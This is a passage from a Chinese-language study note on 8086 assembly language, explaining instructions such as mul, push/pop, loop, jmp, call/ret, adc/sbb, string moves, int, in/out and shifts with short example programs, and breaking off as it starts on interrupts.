  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mul byte ptr ds:[0];含义：(ax)=(al)*((ds)*16+0)</span><br><span class="line"></span><br><span class="line">mul word ptr [bx+si+8]</span><br><span class="line">; 含义：(ax)=(ax)*((ds)*16+(bx)+(si)+8)结果的低16位</span><br><span class="line">; (dx)=(ax)*((ds)*16+(bx)+(si)+8)结果的高16位</span><br></pre></td></tr></table></figure></li>
<li><p>示例</p>
<ul>
<li><p>计算 100*10：</p>
<p>  100 和 10 小于 255，可以做 8 位乘法；</p>
  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov al,100</span><br><span class="line">mov bl,10</span><br><span class="line">mul bl</span><br><span class="line">; 结果(ax)=1000(03E8H)</span><br></pre></td></tr></table></figure></li>
<li><p>100*10000</p>
<p>  100 小于 255，10000 大于 255，要做 16 位乘法；</p>
  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov ax,100</span><br><span class="line">mov bx,10000</span><br><span class="line">mul bx</span><br><span class="line">; 结果 (ax)=4240H,(dx)=000FH,(1000000=F4240H)</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ul>
<h3 id="push、pop指令"><a href="#push、pop指令" class="headerlink" title="push、pop指令"></a><code>push</code>、<code>pop</code>指令</h3><p>push指令和pop指令用于实现寄存器/内存单元和栈空间之间传送数据，push用于数据入栈，pop用于数据出栈；</p>
<p>具体指令为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">push	寄存器/段寄存器/内存空间</span><br><span class="line">pop		寄存器/段寄存器/内存空间</span><br><span class="line"># example</span><br><span class="line">push ax</span><br><span class="line">push ds</span><br><span class="line">push [0]</span><br><span class="line">pop bx</span><br><span class="line">pop es</span><br><span class="line">pop [2]</span><br></pre></td></tr></table></figure>

<ul>
<li>push指令执行步骤：<ol>
<li> SP=SP-2；</li>
<li> 向SS:SP指向的字单元送入数据；</li>
</ol>
</li>
<li>pop指令执行步骤：<ol>
<li> 从SS:SP指向的字单元中读取数据；</li>
<li> SP=SP+2；</li>
</ol>
</li>
</ul>
<p>补充栈知识：</p>
<ul>
<li>  从高地址向低地址存数据，即入栈时，栈顶从高地址向低地址增长；</li>
<li>  当栈为空时，SP指向栈的最底部单元的上一个单元(高地址在底部)；</li>
<li>  栈顶地址通过SS:SP获取；</li>
<li>  栈越界包括PUSH越界和POP越界；</li>
</ul>
<h3 id="loop指令"><a href="#loop指令" class="headerlink" title="loop指令"></a><code>loop</code>指令</h3><p>作用是循环执行某段指令；</p>
<p>格式如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">     mov cx, 循环的次数 # 当遇到Loop标号时 cx就代表循环的次数</span><br><span class="line">标号: 循环执行的程序代码</span><br><span class="line">		 ......</span><br><span class="line">     Loop 标号</span><br></pre></td></tr></table></figure>

<p>loop指令执行流程：</p>
<ol>
<li> <code>cx=cx-1</code>；</li>
<li>判断cx的值：<ol>
<li> 如果不为零，就执行标号处的代码，然后执行第一步；</li>
<li> 如果为零, 执行loop后面的代码；</li>
</ol>
</li>
</ol>
<p>loop的实现其实就是判断cx&gt;0然后jump到标号所在地址；</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">    mov ax, ffffh </span><br><span class="line">    mov ds, ax       # 数据段段地址</span><br><span class="line">    mov dx, 0h    </span><br><span class="line">    mov bx, 0h       # 清空dx和bx 用来接收数据</span><br><span class="line">    mov cx, 3h       # 设置循环次数为3</span><br><span class="line">s:  mov al, [bx]     # 循环取ds:[bx]中的数据, 赋值给al</span><br><span class="line">    mov ah, 0h       # 清空ah中的数据, 用来累加的时候进位</span><br><span class="line">    add dx, ax       # dx = ax + dx</span><br><span class="line">    add bx, 1        # bx = bx + 1</span><br><span class="line">    loop s           # 循环s标记下的代码</span><br></pre></td></tr></table></figure>

<h3 id="and指令"><a href="#and指令" class="headerlink" title="and指令"></a><code>and</code>指令</h3><p>逻辑与指令，按位进行逻辑与运算；</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov al,01100011B</span><br><span class="line">and al,00111011B</span><br></pre></td></tr></table></figure>

<p>结果为<code>al=00100011B</code>；</p>
<h3 id="or指令"><a href="#or指令" class="headerlink" title="or指令"></a><code>or</code>指令</h3><p>逻辑或指令，按位进行逻辑或运算；</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov al,01100011B</span><br><span class="line">or al,00111011B</span><br></pre></td></tr></table></figure>

<p>结果为<code>al=01111011B</code>；</p>
<h3 id="db-dw-dd指令"><a href="#db-dw-dd指令" class="headerlink" title="db/dw/dd指令"></a><code>db</code>/<code>dw</code>/<code>dd</code>指令</h3><p>伪指令，由编译器识别处理；</p>
<p><code>db</code>定义字节型数据，<code>define byte</code>；</p>
<p><code>dw</code>定义字型数据，<code>define word</code>；</p>
<p><code>dd</code>定义双字型数据，<code>define double word</code>；</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">; example</span><br><span class="line">data segment</span><br><span class="line">	db 1</span><br><span class="line">	dw 1</span><br><span class="line">	dd 1</span><br><span class="line">data ends</span><br></pre></td></tr></table></figure>

<p>在data段定义了3个数据：</p>
<p>第一个数据为<code>01H</code>，在<code>data:0</code>，占1个字节；</p>
<p>第二个数据为<code>0001H</code>，在<code>data:1</code>，占1个字，即2个字节；</p>
<p>第三个数据为<code>00000001H</code>，在<code>data:3</code>，占2个字，即4个字节；</p>
<h3 id="dup指令"><a href="#dup指令" class="headerlink" title="dup指令"></a><code>dup</code>指令</h3><p>伪指令，与dd，dw，db配合使用，用来重复定义数据，由编译器识别处理；</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">db 3 dup (0)	; 定义了三个字节，它们的值都是0，相当于：db 0,0,0</span><br><span class="line">db 3 dup (0,1,2)	; 定义了九个字节，它们的值分别是0,1,2,0,1,2,0,1,2，相当于：db 0,1,2,0,1,2,0,1,2</span><br><span class="line">db 3 dup ('abc','ABC')	; 定义了18个字节，它们的值是'abcABCabcABCabcABC'，相当于：db 'abcABCabcABCabcABC'</span><br></pre></td></tr></table></figure>

<p><code>dup</code>使用格式如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">db 重复的次数 dup (重复的字节型数据)</span><br><span class="line">dw 重复的次数 dup (重复的字型数据)</span><br><span class="line">dd 重复的次数 dup (重复的双字型数据)</span><br></pre></td></tr></table></figure>

<h3 id="offset指令"><a href="#offset指令" class="headerlink" title="offset指令"></a><code>offset</code>指令</h3><p>伪指令，由编译器识别处理；</p>
<p>用于返回数据标号的偏移地址([bx,bp,si,di])，这个偏移地址按字节计算，表示的是该数据标号距离数据段起始地址的距离；</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">; 该程序在运行中将s处的一条指令复制到s0处</span><br><span class="line">assume cs:codesg</span><br><span class="line">codesg segment</span><br><span class="line">	s: mov ax,bx							;（mov ax,bx 的机器码占两个字节）</span><br><span class="line">		mov si,offset s</span><br><span class="line">		mov di,offset s0</span><br><span class="line">		mov ax,cs:[si]</span><br><span class="line">		mov cs:[di],ax</span><br><span class="line">	s0: nop										;（nop的机器码占一个字节）</span><br><span class="line">    nop</span><br><span class="line">codesg ends</span><br><span class="line">ends</span><br></pre></td></tr></table></figure>

<h3 id="jmp指令"><a href="#jmp指令" class="headerlink" title="jmp指令"></a><code>jmp</code>指令</h3><h4 id="依据位移进行转移的jmp指令"><a href="#依据位移进行转移的jmp指令" class="headerlink" title="依据位移进行转移的jmp指令"></a>依据位移进行转移的<code>jmp</code>指令</h4><p>无条件转移，可以只修改IP，也可以同时修改CS和IP；</p>
<p>jmp指令要给出两种信息：</p>
<ul>
<li>  转移的目的地址</li>
<li>  转移的距离（段间转移、段内短转移，段内近转移）</li>
</ul>
<h5 id="段内短转移"><a href="#段内短转移" class="headerlink" title="段内短转移"></a>段内短转移</h5><p>格式：<code>jmp short 标号(转到标号处执行指令)</code></p>
<p>这种格式的 jmp 指令实现的是段内短转移，它对IP的修改范围为 -128~127，也就是说，它向前转移时可以最多越过128个字节，向后转移可以最多越过127个字节;</p>
<p><code>short</code>符号说明指令进行的是短转移；</p>
<p>标号是指代码段中的标号，指明了指令要转移的目的地址，指令转移结束后，CS:IP应该指向标号处的指令；</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">assume cs:codesg</span><br><span class="line">codesg segment</span><br><span class="line">  start:mov ax,10h</span><br><span class="line">  	jmp short s</span><br><span class="line">  	mov ax,0h</span><br><span class="line">  s:inc ax		</span><br><span class="line">		mov ax,4c00h</span><br><span class="line">		int 21h</span><br><span class="line">codesg ends</span><br><span class="line">end</span><br></pre></td></tr></table></figure>

<p>程序执行后，ax的值为11h，因为执行<code>jmp short s</code>后，直接越过<code>mov ax,0h</code>，<code>IP</code>指向了标号s处的<code>inc ax</code>；</p>
<p>实际上，<code>jmp short 标号</code>的功能为：<code>(IP)=(IP)+8位位移</code></p>
<ul>
<li><p>  8位位移=标号后处的地址-jmp指令后第一个字节的地址；</p>
</li>
<li><p>  short指明此处的位移是8位位移；</p>
</li>
<li><p>  8位位移的范围为-128～127，用补码表示；</p>
</li>
<li><p>8位位移由编译程序在编译时算出，如下图；</p>
  <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210106152939.png" style="zoom:50%;">

<p>  机器码<code>EB03</code>中的<code>03</code>即上述提到的8位位移；</p>
</li>
</ul>
<h5 id="段内近转移"><a href="#段内近转移" class="headerlink" title="段内近转移"></a>段内近转移</h5><p>格式：<code>jmp near ptr 标号(转到标号处执行指令)</code>，与段内短转移用法基本相同；</p>
<p>功能为：<code>(IP)=(IP)+16位位移</code>，对IP的修改范围为-32768～32767；</p>
<ul>
<li>  16位位移=标号后处的地址-jmp指令后第一个字节的地址；</li>
<li>  <code>near ptr</code>指明此处的位移是16位位移，进行的是段内近转移；</li>
<li>  16位位移的范围为-32768～32767，用补码表示；</li>
<li>  16位位移由编译程序在编译时算出；</li>
</ul>
<h4 id="转移的目的地址在指令中的jmp指令"><a href="#转移的目的地址在指令中的jmp指令" class="headerlink" title="转移的目的地址在指令中的jmp指令"></a>转移的目的地址在指令中的<code>jmp</code>指令</h4><p>前面的两个jmp指令对应的机器指令中并没有转移的目的地址，而是相对于当前IP的转移位移。</p>
<h5 id="段间转移"><a href="#段间转移" class="headerlink" title="段间转移"></a>段间转移</h5><p>格式：<code>jmp far ptr 标号(转到标号处执行指令)</code>，实现段间转移，又称为远转移；</p>
<p>功能：(CS)=标号所在段的段地址；(IP)=标号所在段中的偏移地址；<br><code>far ptr</code>指明了指令用标号的段地址和偏移地址修改CS和IP；</p>
<img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210106154443.png" style="zoom:50%;">

<img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210106155251.png" style="zoom:50%;">

<p>机器码<code>EA0B012B0B</code>中的<code>0B012B0B</code>即CS、IP的内容；</p>
<h4 id="转移地址在寄存器中的jmp指令"><a href="#转移地址在寄存器中的jmp指令" class="headerlink" title="转移地址在寄存器中的jmp指令"></a>转移地址在寄存器中的<code>jmp</code>指令</h4><p>格式：<code>jmp 16位reg</code></p>
<p>功能：<code>(IP)=(16位reg)</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov ax,2233H</span><br><span class="line">jmp ax</span><br><span class="line">; ax中的值会覆盖ip</span><br></pre></td></tr></table></figure>

<img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210107104552.png" style="zoom:50%;">

<h4 id="转移地址在内存中的jmp指令"><a href="#转移地址在内存中的jmp指令" class="headerlink" title="转移地址在内存中的jmp指令"></a>转移地址在内存中的<code>jmp</code>指令</h4><h5 id="段内转移"><a href="#段内转移" class="headerlink" title="段内转移"></a>段内转移</h5><p>格式：<code>jmp word ptr 内存单元地址</code></p>
<p>功能：从内存单元地址处开始存放着一个字，是转移的目的偏移地址，内存地址的表示需要段地址和偏移地址；</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov ax,2233h</span><br><span class="line">mov ds:[0],ax</span><br><span class="line">jmp word ptr ds:[0]		; IP=ds:[0]的字型数据</span><br><span class="line">; 执行之后IP=2233H</span><br></pre></td></tr></table></figure>

<img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210107105722.png" style="zoom:50%;">

<h5 id="段间转移-1"><a href="#段间转移-1" class="headerlink" title="段间转移"></a>段间转移</h5><p>格式：<code>jmp dword ptr 内存单元地址</code></p>
<p>功能：从内存单元地址处开始存放着两个字，高地址处的字是转移的目的地址，低地址处是转移的目的偏移地址</p>
<p><code>cs=内存单元地址+2</code><br><code>ip=内存单元地址</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov ax,0123h</span><br><span class="line">mov ds:[0],ax</span><br><span class="line">mov word ptr ds:[2],0</span><br><span class="line">jmp dword ptr ds:[0] ; ip=ds:[0]的字型数据，cs=ds:[2]的字型数据</span><br><span class="line">; 执行之后，cs=0，ip=0123h cs:ip指向0000:0123</span><br></pre></td></tr></table></figure>

<img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210107110823.png" style="zoom:50%;">

<h3 id="jcxz指令"><a href="#jcxz指令" class="headerlink" title="jcxz指令"></a><code>jcxz</code>指令</h3><p>有条件转移指令，所有的有条件转移指令都是短转移，在对应的机器码中包含转移的位移，而不是目的地址；</p>
<p>对 IP 的修改范围都为： -128～127；</p>
<p>格式：<code>jcxz 标号</code> （如果 (cx)=0 ，转移到标号处执行）</p>
<p>操作： 当 <code>(cx)=0</code>时 ，<code>(IP)=(IP)+8位位移</code></p>
<ul>
<li><p>  8位位移 = 标号处的地址 - jmp指令后的第一个字节地址；</p>
</li>
<li><p>  8位位移的范围-128～127，用补码表示；</p>
</li>
<li><p>  8位位移是编译程序时在编译时算出的；</p>
</li>
</ul>
<p>当 <code>(cx)≠0</code> 时 ，什么也不做（程序向下执行）</p>
<p><code>jcxz 标号</code> 的功能相当于：<code>if((cx)=0) jmp short 标号</code>；</p>
<h3 id="ret-retf指令"><a href="#ret-retf指令" class="headerlink" title="ret/retf指令"></a><code>ret</code>/<code>retf</code>指令</h3><p>调用栈中的数据；</p>
<ul>
<li><p><code>ret</code>指令用栈中的数据，修改IP的内容，从而实现近转移；</p>
<ul>
<li><p>CPU执行<code>ret</code>指令时，进行下面两步操作：</p>
<ol>
<li> <code>(IP)=((SS)*16+(SP))</code></li>
<li> <code>(SP)=(SP)+2</code></li>
</ol>
</li>
<li><p>相当于执行</p>
<p>  <code>pop ip</code></p>
</li>
</ul>
<p>  下面程序<code>ret</code>执行后，<code>(IP)=0</code>，<code>CS:IP</code>指向代码段的第一条指令；</p>
  <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210107114056.png" style="zoom:50%;"></li>
<li><p><code>retf</code>指令用栈中的数据，修改CS和IP的内容，从而实现远转移；</p>
<ul>
<li><p>CPU执行<code>retf</code>指令时，进行下面四步操作：</p>
<ol>
<li> <code>(IP)=((SS)*16+(SP))</code></li>
<li> <code>(SP)=(SP)+2</code></li>
<li> <code>(CS)=((SS)*16+(SP))</code></li>
<li> <code>(SP)=(SP)+2</code></li>
</ol>
</li>
<li><p>相当于执行</p>
<p>  <code>pop ip</code></p>
<p>  <code>pop cs</code></p>
</li>
</ul>
<p>  下面程序<code>ret</code>执行后，<code>(IP)=0</code>，<code>CS:IP</code>指向代码段的第一条指令；</p>
  <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210107114624.png" style="zoom:50%;"></li>
</ul>
<h3 id="call指令"><a href="#call指令" class="headerlink" title="call指令"></a><code>call</code>指令</h3><ul>
<li>CPU执行<code>call</code>指令时，进行两步操作：<ol>
<li> 将当前的IP或CS和IP压入栈中；</li>
<li> 转移；</li>
</ol>
</li>
<li>  <code>call</code>指令与<code>ret</code>/<code>retf</code>配合使用实现压栈和出栈；</li>
<li>  <code>call</code>指令不能实现短转移，除此之外，<code>call</code>指令实现转移的方法和<code>jmp</code>指令的原理相同；</li>
</ul>
<h4 id="依据位移进行转移的call指令"><a href="#依据位移进行转移的call指令" class="headerlink" title="依据位移进行转移的call指令"></a>依据位移进行转移的<code>call</code>指令</h4><ul>
<li><p>  格式：<code>call 标号</code>(将当前的IP压栈后，转到标号处执行指令)</p>
</li>
<li><p>CPU执行此种格式的call指令时，进行如下的操作：</p>
<ol>
<li><p><code>(sp)=(sp)-2</code></p>
<p> <code>((ss)*16+(sp))=(IP)</code></p>
</li>
<li><p><code>(IP)=(IP)+16位位移</code></p>
<ul>
<li><p>  16位位移 = 标号处的地址 - call指令后的第一个字节地址；</p>
</li>
<li><p>  16位位移的范围-32768～32767，用补码表示；</p>
</li>
<li><p>  16位位移是编译程序时在编译时算出的；</p>
</li>
</ul>
</li>
</ol>
</li>
<li><p>call执行<code>call 标号</code>时，相当于进行：</p>
<p>  <code>push IP</code></p>
<p>  <code>jmp near ptr 标号</code></p>
</li>
</ul>
<h4 id="转移目的地址在指令中的call指令"><a href="#转移目的地址在指令中的call指令" class="headerlink" title="转移目的地址在指令中的call指令"></a>转移目的地址在指令中的<code>call</code>指令</h4><ul>
<li><p>  格式：<code>call far ptr 标号</code>，实现的是段间转移.</p>
</li>
<li><p>CPU执行此种格式的call指令时,进行如下的操作:</p>
<ol>
<li><p><code>(sp)=(sp)-2</code></p>
<p> <code>((ss)*16+(sp))=(CS)</code></p>
<p> <code>(sp)=(sp)-2</code></p>
<p> <code>((ss)*16+(sp))=(IP)</code></p>
</li>
<li><p><code>(cs)=标号所在段的段地址</code></p>
<p> <code>(IP)=标号在段中的偏移地址</code></p>
</li>
</ol>
</li>
<li><p>CPU执行<code>call far ptr 标号</code>时,相当于进行:</p>
<p>  <code>push CS</code></p>
<p>  <code>push IP</code></p>
<p>  <code>jmp far ptr 标号</code></p>
</li>
</ul>
<h4 id="转移地址在寄存器中的call指令"><a href="#转移地址在寄存器中的call指令" class="headerlink" title="转移地址在寄存器中的call指令"></a>转移地址在寄存器中的<code>call</code>指令</h4><ul>
<li><p>  格式：<code>call 16位reg</code></p>
</li>
<li><p>CPU执行此种格式的call指令时,进行如下的操作:</p>
<p>  ​    <code>(sp)=(sp)-2</code></p>
<p>  ​    <code>((ss)*16+(sp))=(IP)</code></p>
<p>  ​    <code>(IP)=(16位reg)</code></p>
</li>
<li><p>CPU执行<code>call 16位reg</code>时,相当于:</p>
<p>  <code>push IP</code></p>
<p>  <code>jmp 16 位reg</code></p>
</li>
</ul>
<h4 id="转移地址在内存中的call指令"><a href="#转移地址在内存中的call指令" class="headerlink" title="转移地址在内存中的call指令"></a>转移地址在内存中的<code>call</code>指令</h4><p>转移地址在内存中的call指令有两种格式；</p>
<h5 id="call-word-ptr-内存单元地址"><a href="#call-word-ptr-内存单元地址" class="headerlink" title="call word ptr 内存单元地址"></a><code>call word ptr 内存单元地址</code></h5><ul>
<li><p>CPU执行时,相当于:</p>
<p>  ​    <code>push IP</code></p>
<p>  ​    <code>jmp word ptr 内存单元地址</code></p>
</li>
</ul>
<h5 id="call-dword-ptr-内存单元地址"><a href="#call-dword-ptr-内存单元地址" class="headerlink" title="call dword ptr 内存单元地址"></a><code>call dword ptr 内存单元地址</code></h5><ul>
<li><p>CPU执行时,相当于:</p>
<p>  ​    <code>push CS</code></p>
<p>  ​    <code>push IP</code></p>
<p>  ​    <code>jmp word ptr 内存单元地址</code></p>
</li>
</ul>
<h3 id="adc指令"><a href="#adc指令" class="headerlink" title="adc指令"></a><code>adc</code>指令</h3><p>带进位加法指令，它利用了CF位上记录的进位值；</p>
<p>指令格式: <code>adc 操作对象1,操作对象2</code></p>
<p>功能：<code>操作对象1 = 操作对象1 + 操作对象2 + CF</code></p>
<p>例如:指令<code>adc ax,bx</code>实现的功能是<code>(ax)=(ax)+(bx)+CF</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov ax,3</span><br><span class="line">mov bx,1</span><br><span class="line">sub bx,ax</span><br><span class="line">adc ax,1</span><br><span class="line">; 执行后，(ax)=4。adc执行时，相当于计算: (ax)+1+CF = 2+1+1 = 4。</span><br></pre></td></tr></table></figure>

<h3 id="sbb指令"><a href="#sbb指令" class="headerlink" title="sbb指令"></a><code>sbb</code>指令</h3><p>带借位减法指令，它利用了CF位上记录的借位值；</p>
<p>指令格式：<code>sbb 操作对象1,操作对象2</code>；</p>
<p>功能:<code>操作对象1=操作对象1-操作对象2-CF</code>；</p>
<p>例如，指令<code>sbb ax,bx</code>实现的功能是<code>(ax)=(ax)-(bx)-CF</code></p>
<p>sbb指令执行后，将对CF进行设置；</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">; 计算003E1000H-00202000H,结果放在ax,bx中</span><br><span class="line">mov bx,1000H</span><br><span class="line">mov ax,003EH</span><br><span class="line">sub bx,2000H</span><br><span class="line">sbb ax,0020H </span><br></pre></td></tr></table></figure>

<h3 id="cmp指令"><a href="#cmp指令" class="headerlink" title="cmp指令"></a><code>cmp</code>指令</h3><p>cmp是比较指令，cmp的功能相当于减法指令(sub)。它不保存结果，只是影响相应的标志位，其他的指令通过识别这些被影响的标志位来得知比较结果；</p>
<p>指令格式: <code>cmp  操作对象1,操作对象2</code>；</p>
<p>功能：计算<code>操作对象1-操作对象2</code>，但不保存结果，只是根据结果修改相应的标志位；</p>
<h3 id="条件转移指令"><a href="#条件转移指令" class="headerlink" title="条件转移指令"></a>条件转移指令</h3><p>此处的条件转移指令根据无符号数的比较结果进行转移；</p>
<table>
<thead>
<tr>
<th>指令</th>
<th>含义</th>
<th>检测的相关标志位</th>
</tr>
</thead>
<tbody><tr>
<td>je</td>
<td>等于则转移</td>
<td>zf=1</td>
</tr>
<tr>
<td>jne</td>
<td>不等于则转移</td>
<td>zf=0</td>
</tr>
<tr>
<td>jb</td>
<td>低于则转移</td>
<td>cf=1</td>
</tr>
<tr>
<td>jnb</td>
<td>不低于则转移</td>
<td>cf=0</td>
</tr>
<tr>
<td>ja</td>
<td>高于则转移</td>
<td>cf=0 &amp; zf=0</td>
</tr>
<tr>
<td>jna</td>
<td>不高于则转移</td>
<td>cf=1 | zf=1</td>
</tr>
</tbody></table>
<p>j——jump</p>
<p>e——equal</p>
<p>b——below</p>
<p>a——above</p>
<p>n——not</p>
<h3 id="movsb指令"><a href="#movsb指令" class="headerlink" title="movsb指令"></a><code>movsb</code>指令</h3><p>格式：<code>movsb</code>；</p>
<p>功能：将<code>ds:si</code>指向的内存单元中的字节送入<code>es:di</code>中，然后根据标志寄存器df位的值，将si和di递增或递减；</p>
<p>表示操作如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">((es)*16+(di)) = ((ds)*16+(si))</span><br><span class="line">if df = 0</span><br><span class="line">	(si) = (si) + 1</span><br><span class="line">	(di) = (di) + 1</span><br><span class="line">if df = 1</span><br><span class="line">	(si) = (si) - 1</span><br><span class="line">	(di) = (di) - 1</span><br></pre></td></tr></table></figure>

<h3 id="movsw指令"><a href="#movsw指令" class="headerlink" title="movsw指令"></a><code>movsw</code>指令</h3><p>格式：<code>movsb</code>；</p>
<p>功能：将<code>ds:si</code>指向的内存单元中的字送入<code>es:di</code>中，然后根据标志寄存器df位的值，将si和di递增2或递减2；</p>
<p>表示操作如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov es:[di],word ptr ds:[si]</span><br><span class="line">if df = 0</span><br><span class="line">	add si,2</span><br><span class="line">	add di,2</span><br><span class="line">if df = 1</span><br><span class="line">	sub si,2</span><br><span class="line">	sub di,2</span><br></pre></td></tr></table></figure>

<h3 id="rep指令"><a href="#rep指令" class="headerlink" title="rep指令"></a><code>rep</code>指令</h3><p>按照计数寄存器CX中指定的次数重复执行字符串指令；</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rep movsb</span><br><span class="line">; 相当于</span><br><span class="line">s: movsb</span><br><span class="line">	loop s</span><br></pre></td></tr></table></figure>

<h3 id="cld-std指令"><a href="#cld-std指令" class="headerlink" title="cld/std指令"></a><code>cld</code>/<code>std</code>指令</h3><p><code>cld</code>：将标志寄存器的df位置0；</p>
<p><code>std</code>：将标志寄存器的df位置1；</p>
<h3 id="pushf、popf指令"><a href="#pushf、popf指令" class="headerlink" title="pushf、popf指令"></a><code>pushf</code>、<code>popf</code>指令</h3><p><code>pushf</code>：将标志寄存器的值压栈；</p>
<p><code>popf</code>：从栈中弹出数据送入标志寄存器；</p>
<p><code>pushf</code>和<code>popf</code>为直接访问标志寄存器提供了一种方法；</p>
<h3 id="iret指令"><a href="#iret指令" class="headerlink" title="iret指令"></a><code>iret</code>指令</h3><p>中断返回，中断服务程序的最后一条指令；</p>
<p><code>iret</code>指令将推入堆栈的段地址和偏移地址弹出，使程序返回到原来发生中断的地方，其作用是从中断中恢复中断前的状态；</p>
<p><code>iret</code>指令的功能用汇编语言描述为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pop IP</span><br><span class="line">pop CS</span><br><span class="line">popf</span><br></pre></td></tr></table></figure>

<h3 id="int指令"><a href="#int指令" class="headerlink" title="int指令"></a><code>int</code>指令</h3><p>引发中断，调用“中断例程”（interrupt routine）；</p>
<p>格式：<code>int n</code>，n为中断类型码；</p>
<p>指令执行过程如下：</p>
<ol>
<li><p> 取中断类型码n；</p>
</li>
<li><p> 标志寄存器入栈<code>pushf</code>，<code>IF=0,TF=0</code>（重置中断标志位）；</p>
</li>
<li><p> CS、IP入栈；</p>
</li>
<li><p>查中断向量表， <code>(IP)=(n*4)</code>，<code>(CS)=(n*4+2)</code>；</p>
<p> 从此处转去执行n号中断的中断处理程序；</p>
</li>
</ol>
<h3 id="in-out指令"><a href="#in-out指令" class="headerlink" title="in/out指令"></a><code>in</code>/<code>out</code>指令</h3><p>CPU对外设的操作通过专门的端口读写指令来完成；</p>
<p>读端口用<code>in</code>指令；</p>
<p>写端口用<code>out</code>指令；</p>
<p>例如：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">IN AL,21H		; 表示从21H端口读取一字节数据到AL</span><br><span class="line">IN AX,21H		; 表示从端口地址21H读取1字节数据到AL，从端口地址22H读取1字节到AH</span><br><span class="line">MOV DX,379H</span><br><span class="line">IN AL,DX		; 从端口379H读取1字节到AL</span><br><span class="line">OUT 21H,AL	; 将AL的值写入21H端口</span><br><span class="line">OUT 21H,AX	; 将AX的值写入端口地址21H开始的连续两个字节。（port[21H]=AL,port[22h]=AH）</span><br><span class="line">MOV DX,378H</span><br><span class="line">OUT DX,AX		; 将AH和AL分别写入端口379H和378H</span><br></pre></td></tr></table></figure>

<h3 id="shl-shr指令"><a href="#shl-shr指令" class="headerlink" title="shl/shr指令"></a><code>shl</code>/<code>shr</code>指令</h3><p><code>shl</code>是逻辑左移指令；</p>
<p>功能为：</p>
<ol>
<li> 将一个寄存器或内存单元中的数据向左移位；</li>
<li> 将最后移出的一位写入CF中；</li>
<li> 最低位用0补充；</li>
</ol>
<p>例如：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov al,01001000b</span><br><span class="line">shl al,1 ; 将al中数据左移一位</span><br><span class="line">; 执行后（al）=10010000b，CF=0</span><br></pre></td></tr></table></figure>

<p>注意：如果移动位数大于1时，必须将移动位数放在cl中；</p>
<p>例如：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov al,00110001b</span><br><span class="line">mov cl,3</span><br><span class="line">shl al,cl</span><br><span class="line">; 执行后（al）=10001000b，因为最后移出的一位是1，所以CF=1</span><br></pre></td></tr></table></figure>

<p><code>shr</code>是逻辑右移指令，和shl所进行的操作刚好相反；</p>
<h3 id="字-字节操作判断"><a href="#字-字节操作判断" class="headerlink" title="字/字节操作判断"></a>字/字节操作判断</h3><ol>
<li><p>通过寄存器名判断</p>
<p> ax表示字操作；</p>
<p> al表示字节操作；</p>
</li>
<li><p>通过操作符<code>X ptr</code>判断</p>
<p> <code>X</code>在汇编指令中可以是<code>word</code>和<code>byte</code>；</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov word ptr ds:[0],1</span><br><span class="line">add byte ptr [bx],2</span><br></pre></td></tr></table></figure></li>
<li><p>默认访问</p>
<p> 有些指令默认访问字单元或者字节单元；</p>
<p> 比如push和pop只进行字操作；</p>
</li>
</ol>
<h2 id="中断"><a href="#中断" class="headerlink" title="中断"></a>中断</h2><p>中断信息：任何一个通用 CPU 都具备一种能力, 可以在执行完当前正在执行的指令之后, 检测到从 CPU 外部发送过来的或者内部产生的一种特殊信息, 并且可以立即对所接受到的信息进行处理. 这种特殊的信息称为：中断信息。中断意味着 CPU 不再继续向下执行, 而是转去处理这个特殊的信息.</p>
<h3 id="内中断"><a href="#内中断" class="headerlink" title="内中断"></a>内中断</h3><ol>
<li><p> CPU 内部产生的中断称为<strong>内中断</strong></p>
</li>
<li><p>中断类型码</p>
<p> 中断类型码是中断来源信息的编码，在8086CPU中使用一个字节的长度来编码中断源；</p>
<p> 对于 8086CPU, 有四种中断信息，类型码表示如下；</p>
<table>
<thead>
<tr>
<th>中断原因</th>
<th>中断类型码</th>
</tr>
</thead>
<tbody><tr>
<td>除法错误</td>
<td>0</td>
</tr>
<tr>
<td>单步执行</td>
<td>1</td>
</tr>
<tr>
<td>执行 into 指令</td>
<td>4</td>
</tr>
<tr>
<td>执行 int 指令</td>
<td>n（int n，n为字节型立即数）</td>
</tr>
</tbody></table>
</li>
<li><p>中断处理程序</p>
